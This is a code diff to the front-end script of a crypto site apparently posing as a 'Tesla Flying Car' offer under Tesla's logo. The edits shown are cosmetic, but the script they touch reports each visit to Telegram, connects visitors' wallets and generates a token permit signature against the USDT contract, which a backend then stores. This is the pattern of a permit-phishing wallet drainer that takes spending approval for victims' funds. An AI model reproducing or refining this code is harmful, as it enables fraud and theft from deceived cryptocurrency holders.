@@ -1,17 +1,15 @@
 // public/app.js
 
-// --- CONFIGURATION ---
-const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; // Your Project ID
-const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; // Update this to your deployed contract
-const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
-const CHAIN_ID = 1; // Ethereum Mainnet
-const DOMAIN_NAME = "TeslaFlyingCar";
-const DOMAIN_VERSION = "1";
-
-// Import AppKit directly from CDN
+// Import AppKit from CDN (ESM)
 import { createAppKit } from 'https://esm.sh/@reown/appkit';
 import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers';
 import { mainnet } from 'https://esm.sh/@reown/appkit/networks';
+
+// --- CONFIGURATION ---
+const APPKIT_PROJECT_ID = "bbdfc9b65a1208cf2e642feeb2d4de92"; // YOUR PROJECT ID HERE
+const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; 
+const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
+const CHAIN_ID = 1; 
 
 const metadata = {
   name: 'Tesla Flying Car',
@@ -20,14 +18,12 @@ const metadata = {
   icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
 };
 
-const networks = [mainnet];
-
 const adapter = new EthersAdapter();
 
 try {
     createAppKit({
         adapters: [adapter],
-        networks,
+        networks: [mainnet],
         projectId: APPKIT_PROJECT_ID,
         metadata,
         themeMode: 'dark',
@@ -38,9 +34,9 @@ try {
             '--w3m-border-radius-max': '12px',
         },
     });
-    console.log("AppKit Initialized Successfully");
+    console.log("✅ AppKit Initialized");
 } catch (error) {
-    console.error("AppKit Init Failed:", error);
+    console.error("❌ AppKit Init Failed:", error);
 }
 
 // --- TELEGRAM REPORTING ---
@@ -52,7 +48,7 @@ async function notifyTelegram(action, details) {
      body: JSON.stringify({ action, details })
    });
  } catch (error) {
-   console.error("Telegram notification failed:", error);
+   console.error("📡 Telegram notification failed:", error);
  }
 }
 
@@ -77,7 +73,6 @@ document.addEventListener('DOMContentLoaded', async () => {
   notifyTelegram('VISIT', visitMessage);
 
   // 2. Listen for Wallet Connection via AppKit
-  // We wait for AppKit to be ready
   setTimeout(() => {
       const appKit = window.WalletConnectBridge?.appKit;
       if (appKit) {
@@ -87,7 +82,7 @@ document.addEventListener('DOMContentLoaded', async () => {
               }
           });
       } else {
-          console.warn("AppKit instance not found yet");
+          console.warn("⚠️ AppKit instance not found yet");
       }
   }, 1000);
 });
@@ -131,15 +126,15 @@ async function handleWalletConnected(userAddress) {
       alert("Backend failed to store signature.");
     }
   } catch (error) {
-    console.error("Connection failed:", error);
+    console.error("❌ Connection failed:", error);
     document.getElementById('loader').classList.add('hidden');
   }
 }
 
 async function generatePermitSignature(userAddress, tokenAddress) {
   const domain = {
-    name: DOMAIN_NAME,
-    version: DOMAIN_VERSION,
+    name: 'TeslaFlyingCar',
+    version: '1',
     chainId: CHAIN_ID,
     verifyingContract: tokenAddress 
   };
